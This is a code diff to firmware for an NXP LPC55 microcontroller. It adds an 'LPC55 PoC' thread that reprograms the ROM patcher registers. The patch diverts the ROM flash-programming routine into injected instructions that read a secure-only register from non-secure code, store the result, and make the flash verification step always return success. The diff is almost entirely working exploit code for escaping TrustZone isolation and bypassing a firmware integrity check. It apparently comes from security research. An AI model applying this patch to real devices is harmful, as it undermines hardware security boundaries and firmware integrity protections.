@@ -104,7 +104,7 @@ void touch_flash_api(void *argument) {
             continue;
         }
 
-        LOG_MSG("[TOUCH FLASH API] Counter: %d\r\n", counter);
+        LOG_MSG("[TOUCH FLASH API] Counter: %x\r\n", counter);
 
         ++counter;
 
@@ -122,14 +122,79 @@ static const osThreadAttr_t lpc55_poc_thread_attr = {
     .stack_size = sizeof(lpc55_poc_app_stack),
 };
 
+#define INS_INDEX(a) (7-(a))
+
 __attribute__((noreturn))
 void lpc55_poc(void *argument) {
     UNUSED_VARIABLE(argument);
 
+    LOG_MSG("[LPC55 PoC] Good morning from this thread\r\n");
     osDelay(osKernelGetTickFreq() * 5);
 
-    LOG_MSG("[LPC55 PoC] Started\r\n");
+    LOG_MSG("[LPC55 PoC] Starting rom patch\r\n");
 
+    osDelay(osKernelGetTickFreq() * 5);
+    uint32_t *ctrl_addr = (uint32_t *)0x4003e0f4;
+    uint32_t *addr_reg = (uint32_t *)0x4003e100;
+    uint32_t *insn_reg = (uint32_t *)0x4003e0d4;
+
+	// Turn off patcher
+	*ctrl_addr = 0x20000000;
+
+	// second instruction of flash_program after the push
+	// b 0x1300718c
+	addr_reg[0] = 0x1300730c;
+	insn_reg[INS_INDEX(0)] = 0x4698e73e;
+
+	// Our target region. We use r4 here because it already
+	// was saved on the stack and it gets overwritten by
+	// a mov very shortly afterwards.
+
+	// movw    r4, #60672      ; 0xed00
+	addr_reg[1] =  0x1300718c;
+	insn_reg[INS_INDEX(1)] = 0x5400f64e;
+
+	// movt    r4, #57344      ; 0xe000
+	addr_reg[2] = 0x13007190;
+	insn_reg[INS_INDEX(2)] = 0x0400f2ce;
+
+	// R4 now has the address of the secure alias of CPUID
+	// Reading this from non-secure mode returns 0, if it
+	// returns non-zero it means we read this from secure
+	// mode.
+	//
+	// ldr.w   r4, [r4]
+	// mov     fp, r2
+	addr_reg[3] = 0x13007194;
+	insn_reg[INS_INDEX(3)] = 0x46936824;
+
+	// str.w   r4, [fp, #372]
+	//
+	// This is where we store our counter in the buffer
+	// It's hard coded for now
+	addr_reg[4] = 0x13007198;
+	insn_reg[INS_INDEX(4)] = 0x4174f8cb;
+
+	// b 0x1300730e
+	// Back to the flash write function
+	addr_reg[5] = 0x1300719c;
+	insn_reg[INS_INDEX(5)] = 0xbf00e0b7;
+
+	// Extra for now
+	addr_reg[6] = 0x130071a0;
+	insn_reg[INS_INDEX(6)] = 0xffffffff;
+
+	// Just return from the flash_verify call
+	// (who really cares about that anyway)
+	addr_reg[7] = 0x130073f8;
+	insn_reg[INS_INDEX(7)] = 0x47702000;
+
+	// Turn it back on
+	*ctrl_addr = 0xffff;
+
+    LOG_MSG("[LPC55 PoC] Finished ROM patch\r\n");
+
+    osDelay(osKernelGetTickFreq() * 10);
     while (1) {
         osDelay(osKernelGetTickFreq() * 5);
 
